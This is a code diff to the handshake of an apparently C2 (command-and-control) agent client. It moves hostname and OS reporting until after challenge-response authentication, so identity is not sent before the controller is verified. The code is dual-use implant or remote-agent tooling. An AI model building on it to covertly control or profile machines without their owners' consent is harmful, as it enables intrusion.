@@ -165,17 +165,17 @@ class AgentClient:
     async def _handshake(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> bool:
         """Challenge-response registration with the C2.
 
-        Sends a ``register`` packet carrying a random nonce instead of the
-        plaintext token, receives the C2's ``sha256(nonce + c2_auth_tokens)``
-        challenge, verifies it against the locally stored token, then confirms
-        with ``register_confirm``. Returns False (and disconnects) on any
+        Sends a ``register`` packet carrying ONLY a random nonce (no agent id /
+        hostname / os yet, so identity is not leaked before authentication).
+        Receives the C2's ``sha256(nonce + c2_auth_tokens)`` challenge, verifies
+        it against the locally stored token, and only after verification sends
+        ``register_confirm`` now carrying the identity fields
+        (agent_id, hostname, os). Returns False (and disconnects) on any
         verification failure.
         """
         nonce = secrets.token_hex(16)
         req_id = self.next_request_id()
-        hostname = socket.gethostname()
-        os_name = _detect_os()
-        pkt = encode_control(req_id, CMD_REGISTER, [self._agent_id, nonce, hostname, os_name])
+        pkt = encode_control(req_id, CMD_REGISTER, [nonce])
         async with self._write_lock:
             writer.write(pkt)
             await writer.drain()
@@ -189,8 +189,12 @@ class AgentClient:
             logger.warning("auth verification failed (token mismatch)")
             return False
 
+        hostname = socket.gethostname()
+        os_name = _detect_os()
         req_id = self.next_request_id()
-        pkt = encode_control(req_id, CMD_REGISTER_CONFIRM, [self._agent_id])
+        pkt = encode_control(
+            req_id, CMD_REGISTER_CONFIRM, [self._agent_id, hostname, os_name]
+        )
         async with self._write_lock:
             writer.write(pkt)
             await writer.drain()
